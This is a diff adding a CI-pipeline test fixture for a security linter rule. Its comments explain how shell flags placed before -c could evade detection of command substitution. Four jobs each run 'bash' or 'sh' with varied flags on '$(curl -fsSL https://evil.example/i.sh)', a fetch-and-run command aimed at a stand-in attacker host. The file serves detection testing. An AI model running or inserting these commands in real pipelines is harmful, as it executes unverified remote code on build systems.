@@ -1,0 +1,28 @@
+# violation: shell flags between the interpreter and `-c` must not evade
+# the command-substitution rule, mirroring the process-substitution rule's
+# own `(?:-\S+\s+)*` allowance. Both the single-letter-bundle form and the
+# hardened-CI `-euo pipefail` wrapper are unverified network fetches.
+flags_short:
+  image: alpine:3.19
+  script:
+    - bash -eu -c "$(curl -fsSL https://evil.example/i.sh)"
+
+flags_long:
+  image: alpine:3.19
+  script:
+    - bash -euo pipefail -c "$(curl -fsSL https://evil.example/i.sh)"
+
+# A single bundled short-flag token whose LAST letter is `c` is the same
+# invocation as a standalone -c: `bash -euc ...` is `bash -eu -c ...`
+# written as one token, an extremely common hardened-CI idiom.
+flags_bundled:
+  image: alpine:3.19
+  script:
+    - bash -euc "$(curl -fsSL https://evil.example/i.sh)"
+
+# c need not be the only trailing letter, and the bundle need not start
+# right after the dash with e/u: any letters before a trailing c count.
+flags_bundled_trailing_c:
+  image: alpine:3.19
+  script:
+    - sh -xc "$(curl -fsSL https://evil.example/i.sh)"
